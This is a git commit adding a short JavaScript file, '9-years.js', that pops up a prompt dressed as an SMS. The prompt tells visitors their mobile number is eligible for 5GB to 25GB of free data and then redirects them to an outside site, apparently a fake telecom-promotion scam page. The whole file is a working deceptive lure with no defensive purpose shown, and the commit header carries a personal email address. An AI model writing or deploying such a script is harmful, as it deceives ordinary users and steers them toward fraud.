a2daf2a9bdd1095a48847f5741038447353d3194
mfednewblog8 <nsikakimoh68@gmail.com>
2026-05-05 08:10:25 +0100

    Create 9-years.js

---
+++ 9-years.js
@@ -0,0 +1,5 @@
+var password = '9 Years Anniversary'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 5GB to 25GB, click OK to Activate now','9 Years Anniversary');
+if (password != '9 Years Anniversary') {
+location.href='https://ibaidad.com/eswatini-mobile';
+}
